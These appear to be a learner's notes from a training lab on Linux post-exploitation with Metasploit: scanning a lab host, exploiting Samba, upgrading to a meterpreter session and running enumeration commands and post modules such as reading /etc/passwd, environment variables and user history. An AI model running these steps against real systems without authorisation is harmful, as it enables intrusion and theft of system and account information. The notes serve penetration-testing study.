### Linux post exploitation module
- The MSF provides us with various post exploitation modules for both windows and linux
- We can utilize these post exploitation modules to enumerate information about the linux system we currently have access to:
- enumerate system configuration
- enumerate environment variables
- enumerate network configuration
- vm check
- enumerate  user history

#### lab
- service postgresql start && msfconsole 
- setg RHOSTS demo.ine.local
- db_nmap -sV 192.112.165.3
- search type:exploit samba
- use 3
- set everything requires
- run
- this will give us cmd shell
- ctrl + z [ background the sessions]
- session -u 1 [ upgrading to meterpreter session]
- sysinfo [about system info]
- shell
- /bin/bash -i [ for getting bash shell]
- whoami
- cat /etc/passwd
- cat /etc/*issue
- uname -r [getting kernal info]
- uname -a [getting additional info about kernel]
- ip a [ getting ip interfaces ]
- netstat -antp [listing various service]
- ps aux  [list all the services]
- env [getting environment variables]
- ctrl + c 

#### metasploit modules 
- search enum_configs [this required sessions ]
- loot [ to see all the information ]
- search env platform:linux
- search enum_network
- search enum_protections
- notes [ this command show all the saved info by the previous command in metasploit ]
- search enum_system
- search checkcontainer 
- search checkvm
- search enum_users_history
  
